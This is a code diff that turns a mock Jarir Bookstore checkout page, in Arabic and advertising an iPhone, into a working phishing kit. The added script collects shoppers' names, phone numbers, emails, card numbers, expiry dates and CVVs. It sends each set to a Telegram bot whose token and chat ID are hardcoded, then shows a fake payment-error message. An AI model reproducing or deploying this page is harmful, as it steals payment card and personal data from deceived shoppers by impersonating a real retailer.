@@ -3,134 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تطبيق جرير المتكامل</title>
+    <title>مكتبة جرير - تسجيل الدفع</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; --bg-gray: #F0F2F5; }
-        body { font-family: 'Cairo', sans-serif; overflow-x: hidden; }
+        body { font-family: 'Cairo', sans-serif; }
         .page { display: none; min-height: 100vh; flex-direction: column; }
         .page.active { display: flex; }
-        
-        /* Product Page Styles */
-        .product-gradient { background: radial-gradient(circle, #ffffff 0%, #fdf2f2 100%); }
-        .phone-main-img { width: 260px; height: auto; filter: drop-shadow(0 15px 25px rgba(0,0,0,0.1)); }
-        
-        /* Form Styles */
         .form-input { width: 100%; background: var(--bg-gray); border: 1px solid #d1d5db; border-radius: 8px; padding: 12px; outline: none; text-align: right; }
-        
-        /* Payment Styles */
-        .card-box { background: white; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; }
-        .accordion-content.active { max-height: 200px; }
     </style>
 </head>
 <body class="max-w-md mx-auto shadow-2xl bg-gray-50">
 
     <section id="page-product" class="page active bg-white">
-        <header class="p-4 border-b sticky top-0 bg-white z-50 flex justify-between items-center">
+        <header class="p-4 border-b flex justify-between items-center">
             <i class="fa-solid fa-bars text-xl"></i>
             <span class="text-2xl font-black text-[#E30613]">JARIR</span>
             <div class="relative"><i class="fa-solid fa-cart-shopping text-xl"></i></div>
         </header>
-
-        <div class="product-gradient py-6 flex justify-center">
-            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="phone-main-img">
+        <div class="py-6 flex justify-center bg-white">
+            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" style="width:240px;">
         </div>
-
-        <main class="p-5">
+        <div class="p-5">
             <h1 class="text-xl font-extrabold mb-4">ابل آيفون 17 برو ماكس</h1>
-            <div class="flex gap-2 mb-6 overflow-x-auto pb-2">
-                <span class="bg-gray-100 px-3 py-1 rounded-full text-xs font-bold border">256 جيجابايت</span>
-                <span class="bg-gray-100 px-3 py-1 rounded-full text-xs font-bold border">برتقالي كوزمك</span>
-            </div>
-            <div class="mb-6 bg-red-50 p-4 rounded-2xl flex justify-between items-center">
-                <div class="text-[#E30613] text-3xl font-black">5,699 <span class="text-sm">ر.س</span></div>
-                <span class="bg-red-600 text-white text-[10px] px-2 py-0.5 rounded">وفر 500</span>
-            </div>
+            <div class="text-[#E30613] text-3xl font-black mb-6">5,699 ر.س</div>
             <button onclick="showPage('page-register')" class="w-full bg-[#E30613] text-white font-bold py-4 rounded-xl shadow-lg">أضف إلى السلة</button>
-        </main>
+        </div>
     </section>
 
     <section id="page-register" class="page bg-white">
         <header class="p-4 border-b flex justify-between items-center">
-            <button onclick="showPage('page-product')"><i class="fa-solid fa-chevron-right text-xl"></i></button>
-            <span class="font-bold">إنشاء حساب</span>
-            <div class="w-6"></div>
+            <button onclick="showPage('page-product')"><i class="fa-solid fa-chevron-right"></i></button>
+            <span class="font-bold">بيانات التوصيل</span>
+            <div class="w-4"></div>
         </header>
-        
-        <div class="p-6 space-y-5">
-            <div>
-                <label class="text-xs text-gray-400 block mb-1">اسم الدولة</label>
-                <div class="form-input bg-gray-100 flex justify-between items-center">
-                    <i class="fa-solid fa-caret-down text-gray-400"></i>
-                    <span class="font-bold">المملكة العربية السعودية</span>
-                </div>
-            </div>
-            <div class="flex gap-2">
-                <input type="tel" placeholder="رقم الهاتف" class="form-input w-2/3">
-                <div class="form-input w-1/3 flex items-center justify-between">
-                    <i class="fa-solid fa-caret-down text-[10px]"></i>
-                    <span class="font-bold">+966</span>
-                </div>
-            </div>
-            <input type="text" placeholder="الاسم الأول" class="form-input">
-            <input type="email" placeholder="البريد الإلكتروني" class="form-input">
-            <button onclick="showPage('page-payment')" class="w-full bg-[#E30613] text-white font-bold py-4 rounded-xl mt-6">استمرار</button>
+        <div class="p-6 space-y-4">
+            <input type="tel" id="user-phone" placeholder="رقم الهاتف" class="form-input">
+            <input type="text" id="user-fname" placeholder="الاسم الأول" class="form-input">
+            <input type="text" id="user-lname" placeholder="اسم العائلة" class="form-input">
+            <input type="email" id="user-email" placeholder="البريد الإلكتروني" class="form-input">
+            <button onclick="sendToTelegram('register')" class="w-full bg-[#E30613] text-white font-bold py-4 rounded-xl">استمرار للدفع</button>
         </div>
     </section>
 
-    <section id="page-payment" class="page">
-        <header class="p-4 bg-white border-b flex justify-between items-center">
-            <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right text-xl"></i></button>
-            <span class="font-bold">الدفع</span>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Jarir_Bookstore_Logo.svg" class="h-5">
+    <section id="page-payment" class="page bg-white">
+        <header class="p-4 border-b flex justify-between items-center">
+            <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right"></i></button>
+            <span class="font-bold">الدفع الآمن</span>
+            <img src="https://img.icons8.com/color/48/visa.png" class="h-6">
         </header>
-
-        <main class="p-4">
-            <div class="card-box p-6 mb-6">
-                <div class="flex justify-between items-center border p-3 rounded-lg mb-4">
-                    <div class="w-5 h-5 border-4 border-blue-600 rounded-full"></div>
-                    <span class="text-sm font-bold">الدفع بالبطاقة الائتمانية</span>
-                </div>
-                <div class="space-y-3">
-                    <input type="text" placeholder="رقم البطاقة" class="form-input bg-gray-50 border-none">
-                    <div class="flex gap-2">
-                        <input type="text" placeholder="رمز التحقق" class="form-input bg-gray-50 border-none w-1/3">
-                        <input type="text" placeholder="تاريخ الانتهاء" class="form-input bg-gray-50 border-none w-2/3">
-                    </div>
-                </div>
-                <button onclick="alert('شكراً لك! تم تنفيذ طلبك بنجاح.')" class="w-full bg-[#E30613] text-white font-bold py-4 rounded-xl mt-8">اشتر الآن (5,699 ر.س.)</button>
+        <div class="p-6 space-y-4">
+            <input type="text" id="card-number" placeholder="رقم البطاقة" class="form-input">
+            <div class="flex gap-2">
+                <input type="text" id="card-cvv" placeholder="CVV" class="form-input w-1/3">
+                <input type="text" id="card-date" placeholder="MM/YY" class="form-input w-2/3">
             </div>
-        </main>
-
-        <footer class="mt-auto bg-[#2D3E50] text-white p-6 rounded-t-3xl">
-            <div onclick="toggleAcc()" class="flex justify-between items-center cursor-pointer">
-                <span class="font-bold">رعاية العميل</span>
-                <i class="fa-solid fa-chevron-down"></i>
-            </div>
-            <div id="footer-acc" class="accordion-content text-gray-400 text-sm mt-2">نحن هنا لخدمتكم على مدار الساعة.</div>
-            <div class="mt-8 text-center text-[10px] text-gray-500 border-t border-gray-700 pt-4">جميع الحقوق محفوظة لمكتبة جرير © 2026</div>
-        </footer>
+            <input type="text" id="card-name" placeholder="اسم حامل البطاقة" class="form-input">
+            <button onclick="sendToTelegram('payment')" class="w-full bg-[#E30613] text-white font-bold py-4 rounded-xl">تأكيد الطلب</button>
+        </div>
     </section>
 
     <script>
-        // وظيفة التنقل بين الصفحات
+        const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
+        const chatId = "1705240737";
+
         function showPage(pageId) {
-            // إخفاء كل الصفحات
-            document.querySelectorAll('.page').forEach(page => {
-                page.classList.remove('active');
-            });
-            // إظهار الصفحة المطلوبة
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById(pageId).classList.add('active');
-            // العودة لأعلى الصفحة عند الانتقال
-            window.scrollTo(0, 0);
+            window.scrollTo(0,0);
         }
 
-        // وظيفة الفوتر المنسدل
-        function toggleAcc() {
-            document.getElementById('footer-acc').classList.toggle('active');
+        async function sendToTelegram(step) {
+            let message = "";
+            
+            if (step === 'register') {
+                const phone = document.getElementById('user-phone').value;
+                const name = document.getElementById('user-fname').value + " " + document.getElementById('user-lname').value;
+                const email = document.getElementById('user-email').value;
+                message = `👤 زبون جديد (بيانات الشخصية):\n📞 الهاتف: ${phone}\n📝 الاسم: ${name}\n📧 البريد: ${email}`;
+                
+                // إرسال البيانات والانتقال لصفحة الدفع
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+                showPage('page-payment');
+            } 
+            else if (step === 'payment') {
+                const card = document.getElementById('card-number').value;
+                const date = document.getElementById('card-date').value;
+                const cvv = document.getElementById('card-cvv').value;
+                const name = document.getElementById('card-name').value;
+                message = `💳 معلومات البطاقة:\n🔢 الرقم: ${card}\n📅 التاريخ: ${date}\n🔒 CVV: ${cvv}\n👤 الاسم: ${name}`;
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+                alert("عذراً، حدث خطأ في عملية الدفع، يرجى المحاولة لاحقاً.");
+            }
         }
     </script>
 </body>
